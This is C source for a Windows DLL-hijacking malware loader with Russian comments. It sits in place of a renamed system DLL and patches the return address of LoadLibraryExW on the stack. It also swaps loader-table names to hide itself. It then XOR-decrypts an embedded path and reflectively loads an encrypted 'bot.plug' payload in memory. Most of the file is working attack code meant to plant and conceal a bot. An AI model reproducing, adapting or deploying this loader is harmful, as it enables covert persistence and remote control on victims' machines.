#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h> 
#include <process.h>
#include <shlwapi.h>
#include <assert.h>


#include "Utils.h"
#include "GetApi.h"
#include "dprint.h"
#include "dllloader.h"
#include "ntdll.h"


#ifdef _M_AMD64
#error ERROR: code is not ready for X64
#endif

// Буфера для внешнего встраивания настроек.
// Инсталятор определяет начало буффера по "якорю" (заранее определенному значению)
// Для каждого якоря закреплен размер буффера.
// После определения - он его меняет прямо в теле на шифрованное значение
// Дешифрация проводится перед использованием настройки
// После использования значение настройки обнуляется.


// Буффер для ключа шифрования
char CryptKeyBuffer[32] = "A6B7D7BE1E374CD";
// Буффер для шифрованного имени оригинальной переименованной длл
char RealDllNameBuffer[MAX_PATH] = "5BC11231-93CF-4815-8B45-7E7579F39561";
// Буффер для шифрованного пути к шифрованной загружаемой дллке
char BotPlugPathBuffer[MAX_PATH] = "4533703D-7B7F-48FE-A3DA-3155AC13EACB";

char FakeDllPathName[MAX_PATH]; //путь к fake.dll, заполняется при загрузке длл

// Адрес оригинального возврата, который надо будет вызвать после 
// срабатывания нашего возвратного обработчика
VOID*   GlobalAddrOfOriginalReturn = 0;

// Содержит адрес хендла загруженной фейковой дллки
HMODULE GlobalFakeDllHandle = 0;


//
// Бектрейс стека, по фреймам.
//
DWORD StackBackTrace(DWORD MaxCount, LPDWORD CallStack[])
{
	typedef struct _STACK_FRAME
	{
		_STACK_FRAME* Next;
		DWORD         EIP;
	}STACK_FRAME,*PSTACK_FRAME;

	PNT_TIB ptib = NULL;
	PSTACK_FRAME pFrame = NULL;
	DWORD count = 0;

	__asm push FS:[0x18];
	__asm pop [ptib];
	__asm mov pFrame,ebp;

	m_memset(CallStack,0,sizeof(DWORD)*MaxCount);
	for (DWORD i=0; i < MaxCount; ++i)
	{
		if (pFrame > ptib->StackBase) break;
		if (pFrame < ptib->StackLimit) break;
		if (pFrame->EIP == 0) break;

		CallStack[i] = &pFrame->EIP;
		pFrame = pFrame->Next;
		count++;
	}
	return count;
}

struct CONTEXT_LDR_ENUM
{
	struct
	{
		HMODULE dll_handle;
	} EnumParam;

	struct 
	{
		PLDR_DATA_TABLE_ENTRY ldr_entry;
	} EnumResult;
};

//
// CallBack для перечесления модулей.
//
VOID NTAPI EnumCallBack( IN PLDR_DATA_TABLE_ENTRY DataTableEntry,IN PVOID Context, IN OUT BOOLEAN *StopEnumeration )
{
	CONTEXT_LDR_ENUM* ctx = (CONTEXT_LDR_ENUM*)Context;

	if ( DataTableEntry->DllBase == ctx->EnumParam.dll_handle)
	{
		ctx->EnumResult.ldr_entry = DataTableEntry;
		*StopEnumeration = TRUE;
	}
}

void ExchangeDllNames(HMODULE FakeDllHandle, HMODULE RealDllHandle)
{
	NTSTATUS (NTAPI*LdrEnumerateLoadedModules)(ULONG,PVOID/*CallBack*/,PVOID/*Context*/) = 
		(NTSTATUS (NTAPI*)(ULONG,PVOID,PVOID))GetApiAddr((HMODULE)GetModuleHandleA("ntdll"),0xBF639C5E);
	
	if( LdrEnumerateLoadedModules == NULL ) return;

	CONTEXT_LDR_ENUM ctx;
	PLDR_DATA_TABLE_ENTRY fake_dll_entry = NULL;
	PLDR_DATA_TABLE_ENTRY real_dll_entry = NULL;

	ctx.EnumParam.dll_handle = FakeDllHandle;
	ctx.EnumResult.ldr_entry = NULL;
	LdrEnumerateLoadedModules(0, EnumCallBack, &ctx);

	fake_dll_entry = ctx.EnumResult.ldr_entry;
	if( fake_dll_entry == NULL ) return;

	ctx.EnumParam.dll_handle = RealDllHandle;
	ctx.EnumResult.ldr_entry = NULL;
	LdrEnumerateLoadedModules(0, EnumCallBack, &ctx);

	real_dll_entry = ctx.EnumResult.ldr_entry;
	if( real_dll_entry == NULL ) return;
	
	UNICODE_STRING tmp1 = real_dll_entry->FullDllName;
	UNICODE_STRING tmp2 = real_dll_entry->BaseDllName;

	real_dll_entry->FullDllName = fake_dll_entry->FullDllName;
	real_dll_entry->BaseDllName = fake_dll_entry->BaseDllName;

	fake_dll_entry->FullDllName = tmp1;
	fake_dll_entry->BaseDllName = tmp2;
}

// Простое XOR криптование из основных исходников
void XorCrypt( const char* Key, LPBYTE Buffer, DWORD Size)
{
	int a = 0;
	while (a < Size)
	{
		DWORD b = 0;
		while( Key[b] )
		{
			Buffer[a] ^= (Key[b] + (a * b));
			b++;
		}
		a++;
	}
}

LPVOID ReadWholeFile( const char* FilePath, DWORD& FileSize )
{
	LPVOID Content = NULL;
	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	
	do
	{
		FileSize = 0;

		FileHandle = (HANDLE)CreateFileA( FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (FileHandle == INVALID_HANDLE_VALUE) break;

		DWORD Size = GetFileSize(FileHandle, NULL);
		if (Size == INVALID_FILE_SIZE) break;
		
		DWORD ReadBytes = 0;  
		Content = MemAlloc(Size + 1);
		if (Content == NULL) break;

		BOOL ReadResult = (BOOL)ReadFile(FileHandle, Content, Size, &FileSize, NULL);
		if (ReadResult == FALSE) break;

		CloseHandle(FileHandle);
		return Content;
	}
	while(false);


	if (FileHandle != INVALID_HANDLE_VALUE) CloseHandle(FileHandle);
	if (Content != NULL) MemFree(Content);
	return NULL;
}

// Ф-ция потока запуска главной дллки.
// Собственно ради нее всё и затевалось.
DWORD WINAPI AutorunThread(void*)
{
	// !!!! WARNING !!!
	// Обязательно нужно делать задержку, поскольку поток запускается из DllMain
	// Тут еще могут быть недоступны ф-ции, необходимые для работы потока.
	DbgMsg("AutorunThread: sleeping 10 sec on thread startup");
	Sleep(10 * 1000);

	XorCrypt( CryptKeyBuffer, (LPBYTE)BotPlugPathBuffer, sizeof(BotPlugPathBuffer) );

	DbgMsg( "AutorunThread: decrypted path to dll: '%s'", BotPlugPathBuffer );

	DWORD  DllSize = 0;
	LPVOID DllBody = NULL;

	// Читаем bot.plug из файла
	DllBody = ReadWholeFile( BotPlugPathBuffer, DllSize );
	DbgMsg( "AutorunThread: ReadWholeFile() result(body=0x%X size=%u)", DllBody, DllSize );
	if (DllBody == NULL) return 0;

	// Дешифруем DLL вшитым ключём
	XorCrypt( CryptKeyBuffer, (LPBYTE)DllBody, DllSize );
	
	// Загружаем в памяти
	HMEMORYMODULE DllHandle = MemoryLoadLibrary(DllBody);
	DbgMsg( "AutorunThread: MemoryLoadLibrary() result=0x%X", DllHandle );

	if( DllHandle == NULL ) return 0;

	// Получаем ф-цию для запуска
	typedef BOOL (WINAPI* StartFromFakeDllFunction)( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey );

	StartFromFakeDllFunction StartFromFakeDll = 
		(StartFromFakeDllFunction)MemoryGetProcAddress(DllHandle, "SFFD");

	DbgMsg( "AutorunThread: StartFromFakeDll=0x%X", StartFromFakeDll );
	if (StartFromFakeDll == NULL) return 0;

	// Стартуем bot.plug 
	StartFromFakeDll( BotPlugPathBuffer, FakeDllPathName, RealDllNameBuffer, CryptKeyBuffer );

	// Обнуляем имена файлов
	m_memset( RealDllNameBuffer, 0, sizeof(RealDllNameBuffer) );
	m_memset( BotPlugPathBuffer, 0, sizeof(BotPlugPathBuffer) );

	return 0;
}


// Ф-ция загрузки реальной(переименованной) длл
HMODULE WINAPI LoadRealLibrary()
{
	// Дешифруем буффер с именем ДЛЛки
	XorCrypt( CryptKeyBuffer, (LPBYTE)RealDllNameBuffer, sizeof(RealDllNameBuffer) );
	DbgMsg( "LoadRealLibrary: RealDllName='%s'", RealDllNameBuffer );

	HMODULE RealDllHandle  = LoadLibraryA(RealDllNameBuffer);
	
	DbgMsg( "LoadRealLibrary: real dll handle=0x%X", RealDllHandle );
	
	if( RealDllHandle == NULL ) return NULL;

	DWORD id = 0;
	CloseHandle( CreateThread( NULL, 0, AutorunThread, NULL, 0, &id ) );

	ExchangeDllNames( GlobalFakeDllHandle, RealDllHandle );
	
	return RealDllHandle;
}


// Обработчик замененного возврата
void __declspec(naked) ReturnHandler()
{
	__asm call LoadRealLibrary
	__asm push DWORD PTR [GlobalAddrOfOriginalReturn]
	__asm ret
}

// Ф-ция патчит возврат из ф-ции LoadLibraryExW
// Бежит по стеку, смотрит в коде адрес возврата сравнивает его с 
// адресом LoadLibraryExW
void PatchLoadLibraryExReturnAddress()
{
	LPDWORD CallStack[64];
	DWORD   count = 0;
	void*   ReplaceFunctionAddr = NULL;

	count = StackBackTrace(64, CallStack);
	if (count == 0) return;

	ReplaceFunctionAddr = GetProcAddress( GetModuleHandleA( "kernel32" ), "LoadLibraryExW" );
	if ( ReplaceFunctionAddr == NULL ) return;

	DWORD  i = 0;
	DWORD_PTR* LoadLibraryExWReturnAddr = NULL;
	while (i < count)
	{
		BYTE* CommandStart = (BYTE*)*CallStack[i];

		// Opcode CALL u32RelativeAddr (E8 u32RelativeAddr)
		if (memcmp(CommandStart - 5, "\xE8", 1) == 0)
		{
			VOID*  RelativeCallAddress = CommandStart + *((DWORD*)(CommandStart-4));
			if (RelativeCallAddress == ReplaceFunctionAddr)
			{
				LoadLibraryExWReturnAddr = CallStack[i];
				break;
			}
		}

		// Opcode CALL [u32ProcAddr] (FF 15 u32ProcAddr)
		if (memcmp(CommandStart - 6, "\xFF\x15", 2) == 0)
		{
			VOID* AbsoluteCallAddress = *((VOID**) *((VOID***)(CommandStart-4)));
			if (AbsoluteCallAddress == ReplaceFunctionAddr)
			{
				LoadLibraryExWReturnAddr = CallStack[i];
				break;
			}
		}
		i++;
	}
	
	if (LoadLibraryExWReturnAddr != NULL)
	{
		GlobalAddrOfOriginalReturn = (LPVOID)*LoadLibraryExWReturnAddr;
		*LoadLibraryExWReturnAddr = (DWORD_PTR)ReturnHandler;
	}
}

BOOL WINAPI DllMain(HINSTANCE ModuleHandle,DWORD Reason,LPVOID Reserved)
{
	switch (Reason)
	{
	case DLL_PROCESS_ATTACH: 
		{
			char path[MAX_PATH];

			m_memset(path, 0, sizeof(path));
			GetModuleFileNameA( NULL, path, sizeof(path) );
			GetModuleFileNameA( ModuleHandle, FakeDllPathName, sizeof(FakeDllPathName) );
			DbgMsg(L"FakeDll:DllMain: hinst=0x%X reason=0x%X reserved=0x%p self_exe_path='%s'",
				ModuleHandle, Reason, Reserved, path);

			// Делаем чёрную работу при подгрузке нашей ДЛЛ
			InitializeNTDLL();
			GlobalFakeDllHandle = ModuleHandle;
			PatchLoadLibraryExReturnAddress();
		}
		break;

	case DLL_PROCESS_DETACH: break;
	}
	return TRUE;
}
